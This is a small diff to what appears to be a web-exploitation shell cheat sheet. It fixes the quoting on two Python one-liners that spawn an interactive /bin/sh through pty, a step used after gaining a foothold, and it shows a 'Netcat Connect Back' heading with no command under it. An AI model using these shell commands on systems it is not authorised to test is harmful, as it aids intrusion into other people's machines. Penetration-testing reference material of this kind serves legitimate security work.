@@ -53,9 +53,9 @@ USEFUL SHELL FOR WEB PAGE EXPLOITATION
  
  Python Shell Spwan
  
-       • python -c 'import pty;pty.spawn("/bin/sh")
+       • python -c 'import pty;pty.spawn("/bin/sh")'
        
-       • python3 -c 'import pty;pty.spawn("/bin/sh")
+       • python3 -c 'import pty;pty.spawn("/bin/sh")'
     
     
  Netcat Connect Back
